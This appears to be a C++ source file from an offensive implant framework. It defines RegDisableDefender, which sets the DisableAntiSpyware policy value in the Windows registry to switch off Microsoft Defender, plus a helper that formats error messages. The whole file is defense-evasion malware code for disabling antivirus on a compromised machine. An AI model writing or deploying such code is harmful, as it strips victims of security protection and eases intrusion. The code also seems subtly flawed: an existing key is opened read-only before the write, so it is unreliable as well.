#include <core/corelib.hpp>
#pragma comment(lib, "advapi32")


LPSTR FormatResultError(LRESULT Result) {

    LPSTR Buffer = { };

    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, nullptr, Result, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&Buffer, 0, nullptr);
    return Buffer;
}

LSTATUS RegDisableDefender() {
    HEXANE

    LSTATUS Result  = 0;
    HKEY hkResult   = { };
    HKEY hKey       = HKEY_LOCAL_MACHINE;

    LPSTR Subkey    = R"(SOFTWARE\Policies\Microsoft\Microsoft Defender)";
    LPSTR valueName = "DisableAntiSpyware";
    DWORD Value     = 0x1;

    if ((RegOpenKeyExA(hKey, Subkey, 0, KEY_READ, &hkResult)) != ERROR_SUCCESS) {
        if ((Result = RegCreateKeyExA(hKey, Subkey, 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_SET_VALUE, nullptr, &hkResult, nullptr)) != ERROR_SUCCESS) {
            goto defer;
        }
    }
    if ((Result = RegSetValueExA(hkResult, valueName, 0, REG_DWORD, (CONST PBYTE)&Value, sizeof(DWORD))) != ERROR_SUCCESS) {
        goto defer;
    }

    defer:
    if (hkResult) {
        RegCloseKey(hkResult);
    }
    return Result;
}
